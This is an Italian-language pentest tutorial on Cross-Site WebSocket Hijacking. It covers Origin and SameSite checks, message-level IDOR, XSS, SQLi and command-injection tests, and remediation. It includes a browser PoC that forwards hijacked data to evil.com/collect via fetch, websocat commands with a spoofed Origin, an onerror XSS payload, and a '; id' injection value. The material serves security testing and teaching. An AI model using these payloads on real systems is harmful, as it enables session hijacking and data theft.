---
title: 'Cross-Site WebSocket Hijacking (CSWSH): Pentest e PoC '
slug: websocket-hijacking
description: 'WebSocket hijacking (CSWSH): pentest con verifica Origin e SameSite, PoC in browser, manipolazione dei messaggi e test IDOR, XSS, SQLi ,payload e remediation.'
image: /websocket-hijacking-pentesting-cswsh-web-application-security.webp
draft: false
date: 2026-03-20T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - WebSocket
  - CSWSH
  - WebSocket Hijacking
  - Origin Validation
  - SameSite Cookie
---

# WebSocket Hijacking (CSWSH): Verifica dell'Origin e PoC in Browser

**WebSocket Hijacking** — o **Cross-Site WebSocket Hijacking (CSWSH)** — è una vulnerabilità in cui un server accetta una connessione WebSocket autenticata (tramite cookie di sessione) senza verificare da dove arriva la richiesta. Il risultato, quando tutte le condizioni si verificano, è che un sito malevolo può aprire una connessione persistente bidirezionale verso l'applicazione target usando la sessione della vittima, senza che lei se ne accorga.

A differenza di un attacco CSRF classico, qui non basta "far partire una richiesta non autorizzata": la connessione resta aperta, e se il controllo manca l'attaccante riceve un flusso continuo di dati in tempo reale — non una singola risposta, ma tutto quello che il canale invia finché resta connesso.

Trattiamo la materia su due livelli distinti, perché è l'errore più comune in questo tipo di test: **CSWSH** (il dirottamento della connessione stessa, un problema di autenticazione/autorizzazione sul handshake) e le **vulnerabilità nei messaggi applicativi** (XSS, SQLi, IDOR, command injection che viaggiano *dentro* i messaggi WebSocket) sono due famiglie di bug diverse. Un payload WebSocket mal validato non prova CSWSH, e un handshake senza controllo Origin non prova automaticamente che tu possa leggere dati sensibili — vanno dimostrati separatamente, ciascuno con i propri criteri.

Satellite operativo della [guida pillar API & Modern Web Attacks](/articoli/api-modern-web-attacks-guida-completa/). Vedi anche: [CSRF](/articoli/csrf/), [CORS Misconfiguration](/articoli/cors-misconfiguration/), [XSS](/articoli/xss/).

Riferimenti: [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets), [PortSwigger Cross-Site WebSocket Hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking), [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html), [OWASP WSTG — Testing WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets), [HackTricks CSWSH](https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html), [RFC 6455 — The WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455.html).

***

## Come funziona il protocollo — cosa succede davvero nel handshake

Un WebSocket nasce da una normale richiesta HTTP che chiede un "upgrade" di protocollo:

```
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: session=VICTIM_COOKIE
Origin: https://evil.com
```

Se il server accetta, risponde `101 Switching Protocols` e da quel momento la connessione TCP sottostante smette di parlare HTTP: diventa un canale bidirezionale a frame, dove client e server si scambiano messaggi liberamente finché la connessione resta aperta.

Punti da capire bene, perché è qui che l'audit tecnico casca più spesso:

* **Il cookie viene incluso automaticamente dal browser**, come per qualsiasi richiesta HTTP verso quel dominio — questo è vero e non cambia niente rispetto a CSRF.
* **Non esiste una Same-Origin Policy che impedisca l'apertura della connessione**: qualsiasi pagina, su qualsiasi dominio, può eseguire `new WebSocket("wss://target.com/...")`. Ma questo non significa che il protocollo WebSocket sia privo di qualunque modello di sicurezza basato sull'origine — significa che la responsabilità di applicarlo è spostata interamente lato server, tramite la verifica dell'header `Origin` durante il handshake. È una differenza sottile ma importante da spiegare correttamente in un articolo tecnico.
* **`Origin` non è l'unica difesa possibile.** Un server robusto può combinare la verifica di `Origin` con token anti-CSRF nel handshake (es. in query string o header custom), con le policy `SameSite` sul cookie di sessione, e con un'autenticazione esplicita post-handshake (token scambiato dopo l'upgrade, non derivato solo dal cookie).
* **`SameSite` è una difesa aggiuntiva, non una sostituzione della validazione di `Origin`.** `SameSite=Strict` limita l'invio del cookie alle richieste same-site. `SameSite=Lax` ammette alcune navigazioni cross-site di primo livello, ma normalmente **non** invia il cookie in una connessione WebSocket avviata da JavaScript su un sito esterno — che non è una navigazione di primo livello. Se l'attributo è assente non presumere un comportamento uniforme: verifica la configurazione effettiva del cookie e il comportamento del browser sotto test.
* **`same-site` non significa `same-origin`.** Un sottodominio non affidabile (es. `blog.target.com` rispetto a `app.target.com`) può essere *cross-origin* rispetto all'applicazione e restare comunque *same-site*: in quel caso `SameSite` non blocca nulla. La mitigazione che conta davvero resta la validazione rigorosa di `Origin` nel handshake, insieme a un meccanismo anti-CSRF e all'autenticazione/autorizzazione applicativa — `SameSite` è un livello in più, non il perimetro.

***

## Discovery — mappare la superficie WebSocket

```bash
# Burp Suite: Proxy -> HTTP history, filtra per "Upgrade: websocket"
# oppure Target -> WebSockets history (tab dedicata nelle versioni recenti)

# DevTools del browser: Network -> filtro "WS"

# Nel codice JS lato client, grep per i costruttori:
grep -rn "new WebSocket(" .
grep -rn "io.connect(\|io(" .          # Socket.IO usa un layer applicativo sopra WS
```

Pattern di URL comuni da cercare:

```
wss://target.com/ws
wss://target.com/chat
wss://target.com/realtime
wss://target.com/socket.io/?transport=websocket
wss://api.target.com/v2/stream
```

Nota su **Socket.IO**: non è WebSocket puro. Aggiunge un proprio protocollo applicativo sopra (handshake HTTP long-polling iniziale, poi upgrade, con framing e namespace suoi). I test di Origin e autenticazione restano concettualmente identici, ma la struttura dei messaggi (`42["event_name", data]`) è diversa da un payload WebSocket nativo — tienine conto quando ricostruisci il protocollo.

***

## Verificare il controllo Origin — e perché un 101 da solo non basta

Questo è il punto più frainteso dell'intera classe di vulnerabilità, quindi lo trattiamo con ordine.

### Step 1 — Test del handshake con Origin malevolo

```bash
# websocat: https://github.com/vi/websocat
websocat -H "Origin: https://evil.com" -H "Cookie: session=VALID_SESSION_COOKIE" \
  "wss://target.com/ws"
```

Se la connessione viene accettata (ricevi frame di risposta, non un `403`/chiusura immediata), hai confermato un fatto preciso: **il server non verifica (o verifica male) l'header `Origin` nel handshake**. Questo è un prerequisito necessario per CSWSH — non è CSWSH dimostrato.

`websocat` è un client da riga di comando: imposta manualmente l'header `Origin` e il cookie che gli fornisci tu. Il suo successo prova che il *server* è permissivo, non che un *browser reale*, su un dominio malevolo, con la sessione della vittima già presente nei suoi cookie di `target.com`, riesce a fare la stessa cosa. Per quello serve la PoC in browser (sezione successiva).

Un dettaglio da non confondere: il `Sec-WebSocket-Key` generato casualmente dal client nel handshake **non è un token anti-CSRF**. Serve al meccanismo RFC 6455 di conferma del protocollo (il server lo rielabora in `Sec-WebSocket-Accept`), non dimostra in alcun modo che la richiesta provenga da una pagina autorizzata — non cercarlo come "prova" di legittimità durante il test.

### Step 2 — Isola la variabile: il cookie arriva davvero in un contesto cross-site?

Un `curl` verso l'endpoint di login non riproduce il contesto di un browser autenticato e non ti dice in modo affidabile se quel cookie verrà poi inviato nell'handshake WebSocket cross-site. Verifica invece direttamente nel browser:

```
1. Apri DevTools -> Application/Storage -> Cookies, dopo un login riuscito
   nell'applicazione target.
2. Controlla per il cookie di sessione: Domain, Path, SameSite, Secure, scadenza.
3. Ripeti il login osservando la tab Network per confermare che il cookie
   sia stato effettivamente impostato dalla risposta di login.
4. Solo dopo, esegui la PoC in browser (sezione successiva) e osserva
   nella tab Network/WS se il cookie compare davvero nella richiesta
   di handshake verso il dominio target.
```

* `SameSite=Strict` → il cookie **non** viene inviato in una richiesta cross-site iniziata da un altro dominio. L'attacco in browser, nella sua forma base, non funziona — a prescindere da `Origin`.
* `SameSite=Lax` (default nei browser moderni se l'attributo manca) → normalmente **non** invia il cookie in una connessione WebSocket aperta via JavaScript da un sito esterno, perché non è una navigazione di primo livello. Da verificare comunque empiricamente: le policy sui cookie di terze parti variano per browser e versione.
* `SameSite=None` (richiede `Secure`) → il cookie viene inviato cross-site. Qui il controllo `Origin` lato server è l'unica vera barriera rimasta.
* In ogni caso, ricorda il punto sopra: *same-site* non è *same-origin*. Un sottodominio cross-origin ma same-site può comunque inviare il cookie anche con `Strict`.

### Step 3 — Verifica l'accesso pre-autenticazione

```bash
# Prova a connetterti SENZA alcun cookie
websocat "wss://target.com/ws"
```

Qui serve cautela nell'interpretazione: ricevere *qualcosa* senza cookie non è automaticamente una vulnerabilità. Distingui tra dati pubblici che l'applicazione espone intenzionalmente senza login (es. un contatore di utenti online, un ticker di prezzi pubblici) e dati che dovrebbero essere riservati. Il test è positivo solo se dimostri che una risorsa o un'azione *riservata per design* è raggiungibile senza autenticazione — non basta che il canale risponda.

***

## PoC in browser — la prova che conta davvero

Una PoC da riga di comando con `websocat` dimostra un server permissivo. Una PoC che dimostra **CSWSH realmente sfruttabile** deve girare in un browser, su un'origine diversa, sfruttando solo ciò che il browser farebbe automaticamente — nessun header impostato a mano.

```html
<!-- hosted on https://evil.com/poc.html -->
<script>
// IMPORTANT: the WebSocket constructor only takes (url, protocols) —
// there is no "credentials" option like in the Fetch API. Cookies for
// target.com are attached automatically by the browser if SameSite
// policy allows it in this cross-site context. Nothing to configure here.
const ws = new WebSocket("wss://target.com/ws");

ws.onopen = () => {
  console.log("[+] Connection established from evil.com");
};

ws.onmessage = (event) => {
  console.log("[+] Data received:", event.data);
  // Exfiltrate to attacker-controlled endpoint
  fetch("https://evil.com/collect", {
    method: "POST",
    body: event.data
  });
};

ws.onerror = (e) => console.log("[-] Connection failed:", e);
ws.onclose = (e) => console.log("[-] Closed, code:", e.code);
</script>
```

Apri questa pagina da un browser reale (non dalla stessa macchina dove hai eseguito il login come test — usa due profili/browser separati per simulare davvero vittima e attaccante), con una sessione valida già aperta su `target.com` in quel browser. Solo se `ws.onmessage` riceve dati applicativi reali hai una CSWSH confermata end-to-end: handshake accettato, cookie inviato dal browser nel contesto cross-site, server che non verifica `Origin`, e dati sensibili effettivamente esfiltrati.

Se il canale richiede di inviare un messaggio applicativo prima di ricevere dati (es. un comando "subscribe" o "get\_profile"), **non puoi indovinarlo**: va ricostruito osservando il traffico legittimo (sezione successiva) prima di scriverlo nella PoC.

***

## Ricostruire il protocollo applicativo — prima di exploitarlo

WebSocket definisce solo il trasporto. Cosa significhi ogni messaggio è deciso dall'applicazione, e varia da un target all'altro: non esistono comandi "universali" come `{"action":"get_profile"}` che funzionano ovunque — qualunque payload di esempio in questa guida è illustrativo del *formato*, non un comando da copiare contro un target reale.

Per ricostruirlo:

```bash
# 1. In Burp Suite: apri la tab WebSockets history mentre usi l'applicazione
#    normalmente (loggato, come utente legittimo)
# 2. Osserva ogni messaggio inviato dal client e ogni risposta del server
# 3. Annota: quali campi identificano una risorsa (user_id, channel_id, order_id...)
#    quali sono comandi/azioni (action, type, event)
#    quale struttura ha una risposta di successo vs un errore

# In alternativa, da codice JS lato client (se non minificato):
grep -n "ws.send\|\.emit(" app.js
```

Solo dopo aver osservato il protocollo reale del target puoi costruire payload di test mirati (sostituire un `user_id`, iniettare in un campo testo, ecc.) con la certezza di cosa dovrebbe succedere in condizioni normali — il che è l'unico modo per riconoscere un'anomalia quando la inietti.

***

## Message Manipulation — ogni classe va dimostrata per conto suo

Una volta ricostruito il protocollo, in Burp Repeater puoi modificare e rispedire singoli messaggi WebSocket (tasto destro su un messaggio nella WebSockets history → *Send to Repeater*). Qui il punto critico dell'audit: **il solo invio di un payload non prova la vulnerabilità**. Serve osservare l'effetto.

### IDOR via WebSocket

```json
// Legitimate message observed in normal traffic
{"action": "get_orders", "user_id": 1337}
// -> returns your own orders

// Modified in Repeater
{"action": "get_orders", "user_id": 1}
```

IDOR confermato **solo se** la risposta contiene effettivamente dati appartenenti a `user_id: 1` e non un errore di autorizzazione o un payload vuoto. Se il server valida `user_id` contro la sessione autenticata (ignorando il valore nel messaggio), il test è negativo — e va riportato come tale, non omesso.

### XSS via messaggio WebSocket

```json
{"message": "<img src=x onerror=alert(document.domain)>"}
```

Prova solo qualcosa **se il client (di un altro utente che legge quel messaggio in chat) renderizza il contenuto come HTML** anziché come testo escapato. Verifica il DOM del client ricevente, non solo l'invio: se l'app usa `textContent` invece di `innerHTML` per visualizzare i messaggi, questo payload non fa nulla, a prescindere da quanti WebSocket attraversa.

### SQL injection via messaggio WebSocket

```json
{"message": "test' OR '1'='1"}
```

Il canale è solo il trasporto. Serve l'evidenza standard di SQLi: un errore di sintassi SQL nella risposta, una differenza di comportamento booleana riproducibile, o un time-based confermato — esattamente come testeresti SQLi su un parametro HTTP qualsiasi.

### Command injection via messaggio WebSocket

```json
{"action": "ping", "host": "127.0.0.1; id"}
```

Un campo `host` che accetta `; id` non prova nulla finché non osservi l'effetto del comando iniettato (output nella risposta, side-channel come un ritardo misurabile con `; sleep 5`, o un'interazione OOB). Se il backend passa il valore a una libreria che fa resolve/ping senza invocare una shell, questo payload non produce comandi eseguiti.

### Comandi non autorizzati (privilege escalation sui messaggi)

```json
// If the application exposes admin-only actions over the same WebSocket channel
{"action": "delete_user", "target_id": 42}
{"action": "promote_admin", "user_id": 1337}
```

Da testare solo se hai osservato (o sospetti, dal contesto applicativo) che certi `action` sono riservati a ruoli privilegiati. Conferma solo se l'azione ha effetto reale lato server per un utente che non dovrebbe averne il permesso — un errore `403`/`unauthorized` nella risposta è un test negativo.

***

## Autenticazione post-handshake

Alcune applicazioni non si fidano del solo cookie per autenticare il canale: dopo l'upgrade, il client deve inviare un token esplicito.

```json
// Server, right after 101 Switching Protocols:
{"type": "auth", "token": "?"}

// Expected client response:
{"type": "auth", "token": "<JWT_OR_SESSION_TOKEN>"}
```

Test da eseguire:

```bash
# 1. Non inviare alcun token dopo la connessione -> ricevi comunque dati applicativi?
#    Se sì: l'autenticazione post-handshake è assente o non enforced.

# 2. Invia un token scaduto o manomesso -> il server chiude la connessione
#    o continua a servire dati? Un close code come 1008 Policy Violation
#    e' un possibile segnale, non l'unico esito accettabile: la verifica
#    decisiva e' che il server non restituisca dati protetti e non esegua
#    azioni non autorizzate, qualunque sia il close code usato.

# 3. Dopo un logout lato applicazione (invalidazione sessione), il WebSocket
#    già aperto resta vivo? Molte implementazioni non lo chiudono: è un
#    problema di session management distinto da CSWSH, ma va riportato.
```

Nota tecnica: l'API `WebSocket` nativa del browser (`new WebSocket(url, protocols)`) non permette di impostare header HTTP arbitrari nel handshake — non puoi quindi passare un token di autenticazione come header custom da JavaScript lato client. Se l'applicazione target usa un token nel handshake, arriva tipicamente da query string o subprotocollo; se invece lo scambia nel primo messaggio post-connessione (come nell'esempio sopra), il criterio di sicurezza è lo stesso: il server non deve servire alcun dato protetto prima che quel token sia stato validato.

***

## Output osservato — esempio di laboratorio (simulato)

I valori seguenti sono costruiti per illustrare la forma di una risposta, non copiati da un sistema reale. Etichette ed email sono placeholder.

```
# Simulated CSWSH confirmation against a lab target
$ websocat -H "Origin: https://evil.com" -H "Cookie: session=PLACEHOLDER_SESSION" \
  "wss://lab.local/realtime"

{"type":"notification","data":{"text":"New order #EXAMPLE-001 - placeholder amount"}}
{"type":"user_update","data":{"email":"admin@lab.local","last_login":"EXAMPLE_TIMESTAMP"}}
```

Quello che questo output prova, e non di più: l'handshake è stato accettato con un `Origin` esterno e cookie forniti manualmente, e il canale ha restituito dati applicativi legati all'utente di quella sessione. Non prova — da solo — che un browser reale su un dominio esterno avrebbe inviato quel cookie: per quello serve la PoC in browser della sezione precedente, eseguita e verificata separatamente.

***

## Catene d'impatto — scenari condizionali, non automatici

Le catene seguenti sono **possibili**, non garantite dal solo "manca il controllo Origin". Ogni passaggio ha un prerequisito che va verificato uno per uno prima di scriverlo in un report come impatto reale.

### CSWSH su piattaforma trading → esecuzione di ordini non autorizzati (scenario condizionale)

```
Prerequisito 1: CSWSH confermato in browser (non solo da websocat)
Prerequisito 2: il canale espone lettura di posizioni/ordini pendenti
Prerequisito 3: il canale accetta anche comandi di scrittura (invio ordini)
                senza autenticazione aggiuntiva post-handshake
Prerequisito 4: nessun secondo fattore (conferma via altro canale, es. push/email)
                richiesto per eseguire un ordine

Se e solo se tutti i prerequisiti reggono:
-> un attaccante può leggere posizioni e inviare ordini come la vittima
-> impatto da descrivere come esecuzione di ordini non autorizzati con furto di
   sessione; parlare di "market manipulation" richiede evidenza di un effetto
   misurabile sul mercato, che un singolo test di laboratorio non dimostra —
   non estendere la conclusione oltre quello che hai osservato
```

### CSWSH + XSS stored via messaggio → propagazione in chat (scenario condizionale)

```
Prerequisito 1: CSWSH confermato (per inviare un messaggio come la vittima)
Prerequisito 2: il client di chat renderizza il contenuto del messaggio come HTML,
                senza sanitizzazione (XSS confermato separatamente, vedi sopra)
Prerequisito 3: il payload XSS, una volta eseguito nel browser di un altro utente,
                può a sua volta aprire un nuovo WebSocket e ripetere l'invio

Se e solo se tutti i prerequisiti reggono:
-> propagazione potenzialmente self-replicating nel canale chat
-> il comportamento autoreplicante NON è una conclusione automatica: va
   dimostrato con un numero controllato di "vittime" simulate in laboratorio
   e documentato come catena distinta, prima di comparire in un report
```

Non presentare mai queste catene come conseguenza automatica di un handshake senza controllo Origin: è esattamente l'errore che fa perdere credibilità tecnica a un report.

***

## Scenario dimostrativo simulato

Questo scenario è costruito per illustrare come si concatenano i passaggi della metodologia — non è un test realmente eseguito contro un sistema in produzione, né contro un ambiente di laboratorio specifico documentabile qui. Trattalo come un esempio didattico della sequenza corretta, non come un report.

**Scenario ipotizzato:** applicazione di project management con chat integrata.

**Passaggio 1 (ipotetico):** handshake WebSocket verso `wss://lab.local/realtime` con `Origin: https://attacker-lab.local` e cookie di un utente di test. Se la connessione venisse accettata (`101 Switching Protocols`, nessuna chiusura per Origin non valido), il prerequisito "server permissivo" sarebbe soddisfatto.

**Passaggio 2 (ipotetico):** pagina HTML su un secondo dominio, aperta in un browser con sessione utente già attiva su `lab.local`. Se il WebSocket si connettesse automaticamente con il cookie di sessione e ricevesse notifiche applicative reali (nuovi task, menzioni), questo costituirebbe l'evidenza end-to-end di CSWSH — non il solo passaggio 1.

**Passaggio 3 (ipotetico):** se il campo `text` dei messaggi chat non venisse sanitizzato lato client prima del rendering, un payload `<img src=x onerror=...>` inviato via WebSocket potrebbe eseguirsi nel browser di un altro utente connesso al canale — da verificare come XSS stored distinto, con la sua evidenza propria (esecuzione osservata nel DOM ricevente).

**Limiti dello scenario:** non copre la persistenza della propagazione oltre pochi utenti simulati né il comportamento sotto carico realistico; qualunque test reale su un ambiente specifico deve riverificare rate limiting, WAF e CSP effettivamente presenti, che qui non sono assunti.

**Cosa dimostrerebbe, se eseguito e confermato:** CSWSH (mancanza di controllo Origin + cookie inviato cross-site in un browser reale) e XSS stored nel canale chat (sanitizzazione mancante lato client) restano due vulnerabilità distinte, da riportare e dimostrare separatamente nel report, collegate solo nella sezione impatto.

### Riepilogo evidenze per il report

| Evidenza raccolta                                                       | Conclusione che puoi scrivere                                                            |
| ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| Handshake accettato con `Origin` esterno da client CLI (`websocat`)     | Il server accetta quel valore `Origin` dal client testato — nient'altro                  |
| PoC in browser: cookie inviato automaticamente e dati protetti ricevuti | Evidenza di CSWSH end-to-end, nei limiti dell'ambiente testato                           |
| Messaggio manipolato ma risposta negata/errore di autorizzazione        | La vulnerabilità ipotizzata non è dimostrata da quel test — riportala come test negativo |
| Messaggio alterato che restituisce dati di un altro utente              | Evidenza di una violazione di autorizzazione distinta dal CSWSH                          |

***

## Workflow operativo

**Step 1 — Mappa i canali.** Burp WebSockets history o DevTools → Network/WS, per ogni connessione: path, tipo di dati, WebSocket nativo o Socket.IO.

**Step 2 — Verifica `SameSite` sul cookie di sessione.** Determina se l'attacco cross-site in browser è teoricamente possibile prima di investire tempo nella PoC.

**Step 3 — Test Origin da terminale.** `websocat` con `Origin` esterno e cookie valido: conferma solo la permissività del server.

**Step 4 — PoC in browser.** Pagina HTML su dominio separato, nessun header forzato a mano, sessione vittima reale nel browser di test. Solo questo passaggio conferma CSWSH end-to-end.

**Step 5 — Ricostruisci il protocollo applicativo** osservando traffico legittimo prima di costruire payload di test mirati.

**Step 6 — Testa le classi di vulnerabilità nei messaggi** (IDOR, XSS, SQLi, command injection, auth post-handshake) **separatamente da CSWSH**, ciascuna con la propria evidenza di conferma.

**Step 7 — Documenta ogni catena d'impatto con i suoi prerequisiti espliciti**, distinguendo scenario dimostrato da scenario condizionale.

***

## Checklist WebSocket Hijacking / CSWSH

```
DISCOVERY
[ ] Tutti gli endpoint WebSocket identificati (wss://, ws://)
[ ] Socket.IO vs WebSocket nativo distinto
[ ] Tipo di dati per canale classificato (chat, notifiche, trading, dashboard)

PREREQUISITI
[ ] Attributo SameSite del cookie di sessione verificato
[ ] Origin testato da terminale (websocat) -- conferma solo permissività server
[ ] Autenticazione pre-handshake testata (connessione senza cookie)

CSWSH -- CONFERMA REALE
[ ] PoC HTML eseguita in browser reale, su dominio separato, nessun header forzato
[ ] Dati applicativi reali ricevuti in ws.onmessage, non solo connessione aperta
[ ] Protocollo applicativo ricostruito da traffico osservato, non inventato

AUTENTICAZIONE POST-HANDSHAKE
[ ] Comportamento senza token testato
[ ] Comportamento con token scaduto/invalido testato
[ ] Comportamento dopo logout applicativo (WebSocket già aperto) testato

MESSAGGI -- OGNI CLASSE TESTATA E CONFERMATA SEPARATAMENTE
[ ] IDOR: risposta contiene dati di un altro utente, non solo payload modificato inviato
[ ] XSS: eseguito nel DOM del client ricevente, non solo payload accettato dal server
[ ] SQLi: evidenza standard (errore, booleano, time-based), non solo apostrofo inviato
[ ] Command injection: effetto osservato (output, delay, OOB), non solo payload inviato
[ ] Azioni privilegiate: effetto reale confermato per utente non autorizzato

IMPATTO E REPORTING
[ ] Ogni catena d'impatto riporta i suoi prerequisiti espliciti
[ ] Output simulato/di laboratorio etichettato come tale, nessun dato reale riusato
[ ] Scenario condizionale distinto da scenario dimostrato
```

***

## Remediation

* **Verifica `Origin` su ogni handshake** contro un allowlist esplicita di domini autorizzati — mai una blocklist, mai un controllo regex permissivo su substring.
* **Non fidarti del solo cookie**: richiedi un token esplicito scambiato dopo l'upgrade (`{"type":"auth","token":"..."}`) e verificalo prima di servire qualunque dato.
* **`SameSite=Strict` o `Lax`** sul cookie di sessione dove il flusso applicativo lo permette, più `Secure` e `HttpOnly`.
* **Autorizzazione su ogni messaggio**, non solo al momento della connessione: ogni `action`/`user_id`/`channel_id` ricevuto nel canale va validato contro l'identità della sessione autenticata, esattamente come un endpoint REST.
* **Sanitizza l'output prima del rendering lato client**: se un messaggio può contenere testo libero da altri utenti, trattalo come HTML non fidato (`textContent`, non `innerHTML`; o una libreria di sanitizzazione se serve markup limitato).
* **Chiudi il WebSocket al logout o alla scadenza della sessione**, non solo l'endpoint REST — una connessione persistente aperta prima del logout resta un canale valido se non viene esplicitamente invalidata.
* **Logging e rate limiting** sulle connessioni WebSocket e sui messaggi per canale, per rilevare pattern anomali (connessioni ripetute da origin diversi, volumi di messaggi anomali su un singolo canale).

***

Satellite operativo della [guida pillar API & Modern Web Attacks](/articoli/api-modern-web-attacks-guida-completa/). Vedi anche: [CSRF](/articoli/csrf/), [CORS Misconfiguration](/articoli/cors-misconfiguration/), [XSS](/articoli/xss/).

Riferimenti: [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets), [PortSwigger Cross-Site WebSocket Hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking), [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html), [OWASP WSTG — Testing WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets), [HackTricks CSWSH](https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html), [RFC 6455 — The WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455.html).
